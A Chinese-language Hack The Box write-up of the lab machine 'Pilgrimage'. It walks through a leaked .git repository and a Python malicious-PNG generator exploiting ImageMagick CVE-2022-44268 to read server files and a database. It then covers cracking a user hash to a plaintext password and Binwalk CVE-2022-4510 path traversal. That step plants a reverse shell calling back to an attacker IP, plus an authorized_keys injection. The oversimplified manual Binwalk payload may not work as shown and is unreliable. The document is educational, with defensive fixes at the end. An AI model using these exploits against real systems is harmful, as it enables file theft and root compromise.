---
title: "HTB: Pilgrimage"
difficulty: Easy
date: 2024-09-18
tags: [HTB, Linux, ImageMagick, CVE-2022-44268, Binwalk, CVE-2022-4510]
featured: false
excerpt: "Pilgrimage 是一台 Easy 難度機器，利用 ImageMagick 的任意文件讀取漏洞獲取資料庫憑證，然後通過 Binwalk 的路徑遍歷漏洞實現權限提升。"
---

## 機器資訊

- 平台: Hack The Box
- 難度: Easy
- IP: 10.10.11.219
- 作業系統: Linux (Debian)

## 偵察

### Nmap 掃描

```bash
nmap -sC -sV -p- 10.10.11.219
```

開放端口：
- **22/tcp** - SSH (OpenSSH 8.4p1 Debian)
- **80/tcp** - HTTP (nginx 1.18.0)

### Web 應用分析

訪問網站發現一個圖片壓縮服務 "Pilgrimage"。

功能：
- 上傳圖片
- 自動壓縮並提供下載連結
- 需要註冊/登入

### 目錄枚舉

```bash
gobuster dir -u http://10.10.11.219 -w /usr/share/wordlists/dirb/common.txt
```

發現：
- `/.git/` - 洩露的 Git 倉庫！

### Git 倉庫下載

```bash
wget -r http://10.10.11.219/.git/
cd 10.10.11.219
git status
```

成功獲取完整源代碼！

### 源碼分析

檢查 `index.php`：

```php
$image = new Imagick($upload_path);
$image->setImageFormat('png');
$image->writeImage($output_path);
```

使用 ImageMagick 處理圖片。

檢查 ImageMagick 版本：

```bash
strings magick | grep -i "version"
# ImageMagick 7.1.0-49
```

這個版本存在已知漏洞！

## Initial Access

### CVE-2022-44268 - ImageMagick Arbitrary File Read

ImageMagick 7.1.0-49 存在任意文件讀取漏洞：

**漏洞原理：**
- PNG 圖片可以包含 tEXt chunk 與 `profile` 屬性
- 可以指定讀取伺服器上的任意檔案
- 檔案內容會被編碼到輸出圖片的 metadata 中

### 生成惡意 PNG

```bash
# 創建基本圖片
convert -size 100x100 xc:white test.png

# 注入 payload 讀取 /etc/passwd
pngcrush -text a "profile" "/etc/passwd" test.png exploit.png
```

或使用 Python 腳本：

```python
from PIL import Image
import struct

def create_exploit_png(file_to_read):
    img = Image.new('RGB', (100, 100), color='white')
    img.save('base.png')

    # Add tEXt chunk with file path
    with open('base.png', 'rb') as f:
        data = bytearray(f.read())

    # Insert profile chunk
    chunk_type = b'tEXt'
    chunk_data = b'profile\x00' + file_to_read.encode()
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk = chunk_len + chunk_type + chunk_data

    # Insert before IEND
    iend_pos = data.rfind(b'IEND')
    data[iend_pos:iend_pos] = chunk

    with open('exploit.png', 'wb') as f:
        f.write(data)

create_exploit_png('/etc/passwd')
```

### 上傳並提取數據

1. 註冊帳號並登入
2. 上傳 `exploit.png`
3. 下載處理後的圖片

提取嵌入的數據：

```bash
# 使用 identify 查看 metadata
identify -verbose output.png | grep profile

# 或使用 exiftool
exiftool output.png

# 解碼 hex 數據
echo "726f6f743a..." | xxd -r -p
```

成功讀取到 `/etc/passwd` 內容！

### 讀取應用配置

從源碼看到配置文件可能在：
- `/var/www/pilgrimage.htb/config.php`
- 或環境變數

重複攻擊讀取 SQLite 資料庫路徑：

```python
create_exploit_png('/var/db/pilgrimage')
```

### 下載資料庫

使用文件讀取下載整個 SQLite DB：

```bash
# 讀取資料庫文件
python3 exploit.py --file /var/db/pilgrimage
# 解碼並保存
```

### 資料庫分析

```bash
sqlite3 pilgrimage.db
```

```sql
.tables
-- images, users

select * from users;
```

找到用戶憑證：

```
emily:$2y$10$OBYVjDFCPvGj9E9Y1bq9oOmUbE3HQ6cBUwz.kgGqFZ8w7x5TYZrFu
```

### 破解密碼

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# emily:abigchonkyboi123
```

### SSH 登入

```bash
ssh emily@10.10.11.219
# Password: abigchonkyboi123
```

取得 user flag：

```bash
cat ~/user.txt
```

## 權限提升

### 系統枚舉

檢查運行的進程：

```bash
ps aux
```

發現一個由 root 運行的腳本：

```
root   /usr/sbin/malwarescan.sh
```

### 腳本分析

```bash
cat /usr/sbin/malwarescan.sh
```

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/local/bin/binwalk -e "$1" -C /tmp/extracted

if [[ "$?" -ne "0" ]]; then
    rm -rf /tmp/extracted
fi
```

腳本使用 **Binwalk** 掃描上傳的檔案！

檢查 Binwalk 版本：

```bash
binwalk --help | head -1
# Binwalk v2.3.2
```

### CVE-2022-4510 - Binwalk Path Traversal RCE

Binwalk 2.3.2 存在路徑遍歷漏洞，允許在提取檔案時寫入任意位置。

**漏洞原理：**
- Binwalk 在提取 PFS 文件系統時未正確驗證路徑
- 可以使用 `../` 序列跳出提取目錄
- 配合 cron 或監控腳本觸發代碼執行

### Exploitation

使用公開 POC：

```bash
git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
cd CVE-2022-4510-WalkingPath
```

生成惡意檔案：

```bash
python3 exploit.py exploit.bin 10.10.14.15 4444
```

這會創建一個惡意的 PFS 檔案，包含反向 shell。

### 觸發漏洞

1. 開啟監聽：

```bash
nc -lvnp 4444
```

2. 上傳惡意檔案到被監控的目錄：

```bash
# 找到監控目錄
find /var -type d -writable 2>/dev/null

# 通常是用戶上傳目錄
cp exploit.bin /var/www/pilgrimage.htb/shrunk/
```

3. 等待 cron 執行 malwarescan.sh

幾秒鐘後獲得 root shell！

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

## Flags

```
user.txt: c********************************8
root.txt: 9********************************4
```

## 另一種提權方法

### Binwalk 手動利用

創建惡意 `.ssh/authorized_keys`：

```bash
# 生成 SSH 密鑰對
ssh-keygen -t rsa -f root_key

# 創建 PFS header + 路徑遍歷
echo -ne '\x50\x46\x53\x2F\x30\x2E\x39\x00' > exploit.bin
echo -ne '../../../../root/.ssh/authorized_keys' >> exploit.bin
cat root_key.pub >> exploit.bin
```

上傳後以 root 身份 SSH 登入。

## 總結

Pilgrimage 展示了兩個真實的供應鏈漏洞：

### 攻擊路徑

1. **.git 洩露** → 源碼分析
2. **CVE-2022-44268** → 任意文件讀取
3. **資料庫提取** → 用戶憑證
4. **密碼破解** → SSH 訪問
5. **CVE-2022-4510** → Root RCE

### 學習要點

- Git 倉庫洩露的危害
- ImageMagick 漏洞利用
- SQLite 資料庫分析
- Binwalk 路徑遍歷漏洞
- 進程監控與定時任務

### 防禦建議

1. **保護 .git 目錄**：配置 nginx/apache 阻止訪問
2. **更新依賴**：使用最新版本的 ImageMagick 和 Binwalk
3. **輸入驗證**：嚴格驗證上傳檔案
4. **最小權限**：掃描腳本不應以 root 運行
5. **沙箱隔離**：使用容器隔離文件處理

### 配置修復

Nginx 配置阻止 .git：

```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

## 參考資料

- [CVE-2022-44268 - ImageMagick File Disclosure](https://www.metabaseq.com/imagemagick-zero-days/)
- [CVE-2022-4510 - Binwalk Path Traversal](https://github.com/adhikara13/CVE-2022-4510-WalkingPath)
- [OWASP: Information Exposure Through Source Code](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code)
